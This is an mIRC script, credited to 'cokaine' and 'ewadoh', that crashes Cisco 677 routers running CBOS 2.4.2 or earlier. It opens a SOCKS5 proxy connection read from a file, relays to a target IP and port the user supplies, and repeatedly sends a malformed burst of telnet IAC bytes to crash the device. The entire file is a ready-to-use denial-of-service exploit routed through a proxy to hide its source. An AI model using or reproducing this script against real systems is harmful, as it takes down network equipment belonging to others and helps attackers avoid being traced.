;ereet mIRC script crashing cisco677 routers with CBOS <=2.4.2 according to ciscos advisory. 
;bounces thru a socks5 proxy read from proxy.txt.
;/load -rs path\to\crashrouter.mrc
;idea cokaine, script ewadoh

alias crashsetup {
  write -c crash.ini [doh]
  write crash.ini socksip=
  run notepad crash.ini
}
alias crashrouter {
  if ($1 == $null) {
    echo 4 -a /crashrouter 123.123.123.123 port
    echo 4 -a must be a numeric ip
    return
  }
  var %port = $2
  sockopen proxy $read proxy.txt 1080
  sockmark proxy 0 $2 %port
  echo 4 -a >connecting to socks 5 server $readini(crash.ini,doh,socksip) port 1080...
}
on *:sockopen:proxy:{
  if ($sockerr > 0) { echo 4 -a >sockerr $ifmatch | return }
  echo 4 -a >connected

  bset &con 1 5 1 0
  sockwrite proxy &con

  echo 4 -a sent> $bvar(&con,1,256)
  sockmark proxy 1 $gettok($sock(proxy).mark,2-,32)
}
on *:sockread:proxy:{
  if ($sockerr > 0) { echo 4 -a >sockerr $ifmatch | return }

  sockread 256 &buffer
  echo 4 -a rcvd> $bvar(&buffer,1,256)

  var %mark = $sock(proxy).mark
  if ($gettok(%mark,1,32) == 1) {
    var %port = $gettok(%mark,3,32)
    tokenize 46 $gettok(%mark,2,32)
    bset &con 1 5 1 0 1 $1 $2 $3 $4 $convport(%port).1 $convport(%port).2
    sockwrite proxy &con
    echo 4 -a sent> $bvar(&con,1,256)
    sockmark proxy 2 $gettok($sock(proxy).mark,2-,32)
    .timerTO1 1 10 sockclose proxy
    .timerTO2 1 10 echo 4 -a >unable to connect
    return
  }
  if ($gettok(%mark,1,32) == 2) {
    if ($gettok($bvar(&buffer,1,256),2,32) != 0) { echo 4 -a >error? }
    sockmark proxy
    .timer -m 100 10 sockwrite proxy $chr(255) $+ $str($chr(248),200)
    echo 4 -a >sending crap data...
  }
  .timerTO1 1 5 sockclose proxy
  .timerTO2 1 5 echo 4 -a >connection closed
}
alias convport {

  var %a = $gettok($calc($1 / 256),1,46)
  var %b = $calc($1 - (256 * %a))
  if ($prop == 1) return %a
  if ($prop == 2) return %b
  return %a %b
}

